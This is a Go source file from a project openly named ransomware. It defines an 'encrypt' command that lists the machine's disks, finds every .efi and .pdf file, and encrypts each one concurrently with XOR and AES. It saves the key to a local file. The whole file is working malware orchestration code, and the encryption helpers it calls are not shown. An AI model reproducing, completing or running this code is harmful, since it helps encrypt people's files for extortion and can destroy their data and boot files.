package cmd

import (
	"davidlares/ransomware/aes"
	"davidlares/ransomware/encrypt"
	"davidlares/ransomware/layout"
	"davidlares/ransomware/mapper"

	"github.com/spf13/cobra"
)

var encryptCmd = &cobra.Command{
	Use:   "encrypt",
	Short: "Encrypt function",
	Long:  `Encrypt functionality built with GoLang.`,
	Run: func(cmd *cobra.Command, args []string) {
		// detecting the machine layout
		layout.LayoutExist()
		// saving the AES key for later encryption
		aes.SaveKeyFile("aes_key.txt")
		// encrypt control
		encryptControl := make(chan struct{}, 10)
		// disk
		disk := mapper.ListingDisks()
		// looping disks
		for _, disk := range disk {
			files := mapper.MapFiles(disk, []string{".efi", ".pdf"})
			for _, file := range files {
				// adding to waitgroup
				mapper.Wg.Add(1)
				// encrypt control
				encryptControl <- struct{}{}
				go encrypt.EncryptWithXorAndAES(file, "aes_key.txt", encryptControl)
			}
		}
		// then
		mapper.Wg.Wait()
	},
}

// adding child commands to the encrypt command (= flags)
func init() {
	rootCmd.AddCommand(encryptCmd)
}
